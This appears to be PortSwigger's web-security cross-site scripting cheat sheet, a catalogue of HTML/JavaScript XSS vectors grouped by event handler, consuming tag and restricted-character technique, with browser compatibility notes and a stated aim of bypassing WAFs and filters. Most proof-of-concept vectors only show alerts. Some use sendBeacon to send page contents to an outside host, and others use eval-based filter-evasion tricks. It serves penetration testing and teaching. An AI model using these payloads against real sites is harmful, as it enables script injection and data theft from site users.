
LOGIN
Products
Solutions
Research
Academy
Support
Customers
About
Blog
Careers
Legal
Contact
Resellers
Customers
About
Blog
Careers
Legal
Contact
Resellers
Burp Suite Enterprise Edition
Burp Suite Enterprise Edition
The enterprise-enabled dynamic web vulnerability scanner.
Burp Suite Professional
Burp Suite Professional
The world's #1 web penetration testing toolkit.
Burp Suite Community Edition
Burp Suite Community Edition
The best manual tools to start web security testing.
Dastardly, from Burp Suite
Dastardly, from Burp Suite
Free, lightweight web application security scanning for CI/CD.
View all product editions
Burp Scanner

Burp Suite's web vulnerability scanner

Burp Suite's web vulnerability scanner'
Application Security Testing
See how our software enables the world to secure the web.
DevSecOps
Catch critical bugs; ship more secure software, more quickly.
Penetration Testing
Accelerate penetration testing - find more bugs, more quickly.
Automated Scanning
Scale dynamic scanning. Reduce risk. Save time/money.
Bug Bounty Hunting
Level up your hacking and earn more bug bounties.
Compliance
Enhance security monitoring to comply with confidence.
View all solutions
Product comparison

What's the difference between Pro and Enterprise Edition?

Burp Suite Professional vs Burp Suite Enterprise Edition
Support Center
Get help and advice from our experts on all things Burp.
Documentation
Tutorials and guides for Burp Suite.
Get Started - Professional
Get started with Burp Suite Professional.
Get Started - Enterprise
Get started with Burp Suite Enterprise Edition.
User Forum
Get your questions answered in the User Forum.
Downloads
Download the latest version of Burp Suite.
Visit the Support Center
Downloads

Download the latest version of Burp Suite.

The latest version of Burp Suite software for download
Dashboard
Learning path
Latest topics
All labs
Mystery labs
Hall of Fame
Get started
Get certified
Web Security AcademyCross-site scriptingCheat sheet
Cross-site scripting (XSS) cheat sheet
This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.

You can download a PDF version of the XSS cheat sheet.

This is a PortSwigger Research project. Follow us on Twitter to receive updates.

This cheat sheet is regularly updated in 2023. Last updated: Wed, 16 Aug 2023 07:13:36 +0000.

Table of contents
Event handlers
All tagscustom tagsaabbracronymaddressappletareaarticleasideaudiobbasebdibdobigblinkblockquotebodybrbuttoncanvascaptioncentercitecodecolcolgroupcommandcontentdatadatalistdddeldetailsdfndialogdirdivdldtelementemembedfieldsetfigcaptionfigurefontfooterformframeframeseth1headheaderhgrouphrhtmliiframeimageimginputinskbdkeygenlabellegendlilinklistingmainmapmarkmarqueemenumenuitemmetametermulticolnavnextidnobrnoembednoframesnoscriptobjectoloptgroupoptionoutputpparampictureplaintextpreprogressqrbrprtrtcrubyssampscriptsectionselectshadowslotsmallsourcespacerspanstrikestrongstylesubsummarysupsvgsvg -> animatesvg -> animatemotionsvg -> animatetransformsvg -> settabletbodytdtemplatetextareatfootththeadtimetitletrtrackttuulvarvideowbrxmpAll eventsonafterprintonafterscriptexecuteonanimationcancelonanimationendonanimationiterationonanimationstartonauxclickonbeforecopyonbeforecutonbeforeinputonbeforeprintonbeforescriptexecuteonbeforetoggleonbeforeunloadonbeginonbluronbounceoncanplayoncanplaythroughonchangeonclickoncloseoncontextmenuoncopyoncuechangeoncutondblclickondragondragendondragenterondragleaveondragoverondragstartondropondurationchangeonendonendedonerroronfinishonfocusonfocusinonfocusoutonfullscreenchangeonhashchangeoninputoninvalidonkeydownonkeypressonkeyuponloadonloadeddataonloadedmetadataonmessageonmousedownonmouseenteronmouseleaveonmousemoveonmouseoutonmouseoveronmouseuponmousewheelonmozfullscreenchangeonpagehideonpageshowonpasteonpauseonplayonplayingonpointerdownonpointerenteronpointerleaveonpointermoveonpointeroutonpointeroveronpointerrawupdateonpointeruponpopstateonprogressonratechangeonrepeatonresetonresizeonscrollonscrollendonsearchonseekedonseekingonselectonselectionchangeonselectstartonshowonstartonsubmitontimeupdateontoggleontoggle(popover)ontouchendontouchmoveontouchstartontransitioncancelontransitionendontransitionrunontransitionstartonunhandledrejectiononunloadonvolumechangeonwebkitanimationendonwebkitanimationiterationonwebkitanimationstartonwebkittransitionendonwheelAll browsersChromeFirefoxSafari
Search Type: 
tag
 Search term: 
 
Event handlers that do not require user interaction
Event:

Description:

Tag:

Code:

Copy:

onafterscriptexecute
Fires after script is executed


custom tags
<xss onafterscriptexecute=alert(1)><script>1</script>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
onanimationcancel
Fires when a CSS animation cancels


custom tags
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
onanimationend
Fires when a CSS animation ends


custom tags
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onanimationiteration
Fires when a CSS animation repeats


custom tags
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onanimationstart
Fires when a CSS animation starts


custom tags
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onbeforeprint
Fires before the page is printed


body
<body onbeforeprint=console.log(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes not work in Safari
onbeforescriptexecute
Fires before script is executed


custom tags
<xss onbeforescriptexecute=alert(1)><script>1</script>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
onbeforeunload
Fires after if the url changes


body
<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes not work in Safari
onbegin
Fires when a svg animation begins


animate
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onbounce
Fires when the marquee bounces


marquee
<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
oncanplay
Fires if the resource can be played


audio
<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
oncanplaythrough
Fires when enough data has been loaded to play the resource all the way through


video
<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
oncuechange
Fires when subtitle changes


track
<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> "></video>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
ondurationchange
Fires when duration changes


audio
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onend
Fires when a svg animation ends


animate
<svg><animate onend=alert(1) attributeName=x dur=1s>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onended
Fires when the resource is finished playing


audio
<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onerror
Fires when the resource fails to load or causes an error


audio
<audio src/onerror=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onfinish
Fires when the marquee finishes


marquee
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
onfocus
Fires when the element has focus


a
<a id=x tabindex=1 onfocus=alert(1)></a>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onfocusin
Fires when the element has focus


a
<a id=x tabindex=1 onfocusin=alert(1)></a>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onhashchange
Fires if the hash changes


body
<body onhashchange="print()">
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onload
Fires when the element is loaded


body
<body onload=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onloadeddata
Fires when the first frame is loaded


audio
<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onloadedmetadata
Fires when the meta data is loaded


audio
<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmessage
Fires when message event is received from a postMessage call


body
<body onmessage=print()>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpageshow
Fires when the page is shown


body
<body onpageshow=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onplay
Fires when the resource is played


audio
<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onplaying
Fires the resource is playing


audio
<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpopstate
Fires when the history changes


body
<body onpopstate=print()>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onprogress
Fires when the video/audio begins downloading


audio
<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onrepeat
Fires when a svg animation repeats


animate
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onresize
Fires when the window is resized


body
<body onresize="print()">
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onscroll
Fires when the page scrolls


body
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onscrollend
Fires when the scrolling to the end of the element


custom tags
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes not work in Safari
onstart
Fires when the marquee starts


marquee
<marquee onstart=alert(1)>XSS</marquee>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
ontimeupdate
Fires when the timeline is changed


audio
<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ontoggle
Fires when the details tag is expanded


details
<details ontoggle=alert(1) open>test</details>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ontransitioncancel
Fires when a CSS transition cancels


custom tags
<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
ontransitionend
Fires when a CSS transition ends


custom tags
<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
ontransitionrun
Fires when a CSS transition begins


custom tags
<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
ontransitionstart
Fires when a CSS transition starts


custom tags
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>
Jump to the code
Compatibility:

Does not work in ChromeDoes not work in FirefoxDoes work in Safari
onunhandledrejection
Fires when a promise isn't handled


body
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
onunload
Fires when the page is unloaded


body
<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes not work in Safari
onwebkitanimationend
Fires when a CSS animation ends


custom tags
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes work in Safari
onwebkitanimationiteration
Fires when a CSS animation repeats


custom tags
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onwebkitanimationstart
Fires when a CSS animation starts


custom tags
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes work in Safari
onwebkittransitionend
Fires when a CSS transition ends


custom tags
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
Event handlers that do require user interaction
Event:

Description:

Tag:

Code:

Copy:

onafterprint
Fires after the page is printed


body
<body onafterprint=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes not work in Safari
onauxclick
Fires when right clicking or using the middle button of the mouse


input
<input onauxclick=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes not work in Safari
onbeforecopy
Requires you copy a piece of text


a
<a onbeforecopy="alert(1)" contenteditable>test</a>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onbeforecut
Requires you cut a piece of text


a
<a onbeforecut="alert(1)" contenteditable>test</a>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onbeforeinput
Fires when the value of the element is about to be modified


custom tags
<xss contenteditable onbeforeinput=alert(1)>test
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onbeforetoggle
Fires before the a popop element is toggled


custom tags
<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
onblur
Fires when an element loses focus


custom tags
<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onchange
Requires as change of value


input
<input onchange=alert(1) value=xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onclick
Requires a click of the element


custom tags
<xss onclick="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onclose
Fires when a dialog is closed


dialog
<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
oncontextmenu
Triggered when right clicking to show the context menu


custom tags
<xss oncontextmenu="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
oncopy
Requires you copy a piece of text


custom tags
<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
oncut
Requires you cut a piece of text


custom tags
<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondblclick
Triggered when double clicking the element


custom tags
<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondrag
Triggered dragging the element


custom tags
<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondragend
Triggered dragging is finished on the element


custom tags
<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondragenter
Requires a mouse drag


custom tags
<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondragleave
Requires a mouse drag


custom tags
<xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondragover
Triggered dragging over an element


custom tags
<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondragstart
Requires a mouse drag


custom tags
<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ondrop
Triggered dropping a draggable element


custom tags
<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onfocusout
Fires when an element loses focus


custom tags
<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onfullscreenchange
Fires when a video changes full screen status


video
<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
oninput
Requires as change of value


input
<input oninput=alert(1) value=xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
oninvalid
Requires a form submission with an element that does not satisfy its constraints such as a required attribute.


input
<form><input oninvalid=alert(1) required><input type=submit>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onkeydown
Triggered when a key is pressed


custom tags
<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onkeypress
Triggered when a key is pressed


custom tags
<xss onkeypress="alert(1)" contenteditable style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onkeyup
Triggered when a key is released


custom tags
<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmousedown
Triggered when the mouse is pressed


custom tags
<xss onmousedown="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmouseenter
Triggered when the mouse is hovered over the element


custom tags
<xss onmouseenter="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmouseleave
Triggered when the mouse is moved away from the element


custom tags
<xss onmouseleave="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmousemove
Requires mouse movement


custom tags
<xss onmousemove="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmouseout
Triggered when the mouse is moved away from the element


custom tags
<xss onmouseout="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmouseover
Requires a hover over the element


custom tags
<xss onmouseover="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmouseup
Triggered when the mouse button is released


custom tags
<xss onmouseup="alert(1)" style=display:block>test</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onmousewheel
Fires when the mousewheel scrolls


custom tags
<xss onmousewheel=alert(1) style=display:block>requires scrolling
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
onmozfullscreenchange
Fires when a video changes full screen status


video
<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
onpagehide
Fires when the page is changed


body
<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes not work in Safari
onpaste
Requires you paste a piece of text


a
<a onpaste="alert(1)" contenteditable>test</a>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpause
Requires clicking the element to pause


audio
<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpointerdown
Fires when the mouse down


custom tags
<xss onpointerdown=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpointerenter
Fires when the mouseenter


custom tags
<xss onpointerenter=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpointerleave
Fires when the mouseleave


custom tags
<xss onpointerleave=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpointermove
Fires when the mouse move


custom tags
<xss onpointermove=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpointerout
Fires when the mouse out


custom tags
<xss onpointerout=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpointerover
Fires when the mouseover


custom tags
<xss onpointerover=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onpointerrawupdate
Fires when the pointer changes


custom tags
<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
onpointerup
Fires when the mouse up


custom tags
<xss onpointerup=alert(1) style=display:block>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onratechange
Fires when the speed of the video changes


audio
<audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onreset
Requires a click


form
<form onreset=alert(1)><input type=reset>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onsearch
Fires when a form is submitted and the input has a type attribute of search


input
<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
onseeked
Requires clicking the element timeline


audio
<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onseeking
Requires clicking the element timeline


audio
<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onselect
Requires you select text


input
<input onselect=alert(1) value="XSS" autofocus>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onselectionchange
Fires when text selection is changed on the page


body
<body onselectionchange=alert(1)>select some text
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes work in Safari
onselectstart
Fires when beginning a text selection


body
<body onselectstart=alert(1)>select some text
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes work in Safari
onshow
Fires context menu is shown


menu
<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
Jump to the code
Compatibility:

Does not work in ChromeDoes work in FirefoxDoes not work in Safari
onsubmit
Requires a form submission


form
<form onsubmit=alert(1)><input type=submit>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ontoggle(popover)
Fires when the a popop element is toggled


custom tags
<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>
Jump to the code
Compatibility:

Does work in ChromeDoes not work in FirefoxDoes not work in Safari
ontouchend
Fires when the touch screen, only mobile device


body
<body ontouchend=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ontouchmove
Fires when the touch screen and move, only mobile device


body
<body ontouchmove=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
ontouchstart
Fires when the touch screen, only mobile device


body
<body ontouchstart=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onvolumechange
Requires volume adjustment


audio
<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
onwheel
Fires when you use the mouse wheel


body
<body onwheel=alert(1)>
Jump to the code
Compatibility:

Does work in ChromeDoes work in FirefoxDoes work in Safari
Consuming tags
Works in Chrome Works in Firefox Works in Safari
Noembed consuming tag

<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Noscript consuming tag

<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Style consuming tag

<style><img title="</style><img src onerror=alert(1)>"></style>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Script consuming tag

<script><img title="</script><img src onerror=alert(1)>"></script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
iframe consuming tag

<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
xmp consuming tag

<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
textarea consuming tag

<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
noframes consuming tag

<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
Title consuming tag

<title><img title="</title><img src onerror=alert(1)>"></title>
Jump to the code
File upload attacks
Works in Chrome Works in Firefox Works in Safari
Add blob to file object

<input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>
Jump to the code
Restricted characters
Works in Chrome Works in Firefox Works in Safari
No parentheses using exception handling

<script>onerror=alert;throw 1</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using exception handling no semi colons

<script>{onerror=alert}throw 1</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using exception handling no semi colons using expressions

<script>throw onerror=alert,1</script>
Jump to the codeWorks in Chrome
No parentheses using exception handling and string eval on Chrome / Edge

<script>throw onerror=eval,'=alert\x281\x29'</script>
Jump to the codeWorks in Safari
No parentheses using exception handling and string eval on Safari

<script>throw onerror=eval,'alert\x281\x29'</script>
Jump to the codeWorks in Firefox
No parentheses using exception handling and object eval on Firefox

<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
Jump to the codeWorks in Firefox Works in Safari
No parentheses using exception handling and object eval on Firefox / Safari

<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using exception handling and location hash eval on all browsers

<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses, no quotes, no spaces using exception handling and location hash eval on all browsers

<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers

<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using ES6 hasInstance and instanceof with eval

<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using ES6 hasInstance and instanceof with eval without .

<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using location redirect

<script>location='javascript:alert\x281\x29'</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using location redirect no strings

<script>location=name</script>
Jump to the codeWorks in Chrome Works in Firefox Works in Safari
No parentheses using template strings

<script>alert`1`</script>
